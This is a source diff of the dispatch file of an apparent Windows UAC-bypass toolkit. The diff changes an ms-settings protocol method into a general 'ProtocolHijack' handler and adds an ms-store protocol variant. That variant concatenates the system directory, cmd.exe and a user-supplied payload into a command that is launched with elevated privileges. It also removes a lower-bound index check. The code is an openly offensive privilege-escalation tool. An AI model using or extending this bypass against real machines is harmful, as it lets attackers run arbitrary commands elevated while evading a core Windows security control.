@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2015 - 2020
+*  (C) COPYRIGHT AUTHORS, 2015 - 2021
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.54
+*  VERSION:     3.55
 *
-*  DATE:        26 Dec 2020
+*  DATE:        02 Mar 2021
 *
 *  UAC bypass dispatch.
 *
@@ -43,7 +43,7 @@ UCM_API(MethodDeprecated);
 UCM_API(MethodIeAddOnInstall);
 UCM_API(MethodWscActionProtocol);
 UCM_API(MethodFwCplLua2);
-UCM_API(MethodMsSettingsProtocol);
+UCM_API(MethodProtocolHijack);
 
 ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
     UacMethodWow64Logger,
@@ -51,7 +51,9 @@ ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
     UacMethodNICPoison,
     UacMethodIeAddOnInstall,
     UacMethodWscActionProtocol,
-    UacMethodFwCplLua2
+    UacMethodFwCplLua2,
+    UacMethodMsSettingsProtocol,
+    UacMethodMsStoreProtocol
 };
 
 UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
@@ -122,7 +124,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodIeAddOnInstall, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodWscActionProtocol, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodFwCplLua2, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
-    { MethodMsSettingsProtocol, { 10240, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE }
+    { MethodProtocolHijack, { 10240, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
+    { MethodProtocolHijack, { 17763, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE }
 };
 
 /*
@@ -271,7 +274,7 @@ NTSTATUS MethodsManagerCall(
         return STATUS_NOT_SUPPORTED;
     }
 
-    if ((Method >= UacMethodMax) || (Method < UacMethodTest))
+    if (Method >= UacMethodMax)
         return STATUS_INVALID_PARAMETER;
 
     //
@@ -283,7 +286,10 @@ NTSTATUS MethodsManagerCall(
     }
 #endif //_WIN64
 
+#pragma warning(push)
+#pragma warning(disable:33010) //BS disable.
     Entry = &ucmMethodsDispatchTable[Method];
+#pragma warning(pop)
 
     Status = IsMethodMatchRequirements(Entry);
     if (!NT_SUCCESS(Status))
@@ -542,7 +548,7 @@ UCM_API(MethodTokenModUIAccess)
 
 UCM_API(MethodShellWSReset)
 {
-    ULONG Result = 0;
+    NTSTATUS Result = STATUS_ACCESS_DENIED;
     LPWSTR PayloadParameter = NULL, PayloadFinal = NULL;
     SIZE_T Size;
 
@@ -675,19 +681,44 @@ UCM_API(MethodFwCplLua2)
     return ucmFwCplLuaMethod2(lpszPayload);
 }
 
-UCM_API(MethodMsSettingsProtocol)
+UCM_API(MethodProtocolHijack)
 {
-    LPWSTR lpszPayload = NULL;
-
-    UNREFERENCED_PARAMETER(Parameter);
+    NTSTATUS Result = STATUS_ACCESS_DENIED;
+    LPWSTR PayloadParameter = NULL, PayloadFinal = NULL;
+    SIZE_T Size;
 
     //
     // Select target application or use given by optional parameter.
     //
     if (g_ctx->OptionalParameterLength == 0)
-        lpszPayload = g_ctx->szDefaultPayload;
+        PayloadParameter = g_ctx->szDefaultPayload;
     else
-        lpszPayload = g_ctx->szOptionalParameter;
+        PayloadParameter = g_ctx->szOptionalParameter;
 
-    return ucmMsSettignsProtocolMethod(lpszPayload);
+    switch (Parameter->Method) {
+    
+    case UacMethodMsSettingsProtocol:
+        Result = ucmMsSettingsProtocolMethod(PayloadParameter);
+        break;
+    
+    case UacMethodMsStoreProtocol:
+
+        Size = ((MAX_PATH * 2) + _strlen(PayloadParameter)) * sizeof(WCHAR);
+        PayloadFinal = supHeapAlloc(Size);
+        if (PayloadFinal) {
+
+            _strcpy(PayloadFinal, g_ctx->szSystemDirectory);
+            _strcat(PayloadFinal, CMD_EXE);
+            _strcat(PayloadFinal, RUN_CMD_COMMAND);
+            _strcat(PayloadFinal, PayloadParameter);
+            Result = ucmMsStoreProtocolMethod(PayloadFinal);
+            supHeapFree(PayloadFinal);
+        }
+        break;
+
+    default:
+        break;
+    }
+
+    return Result;
 }
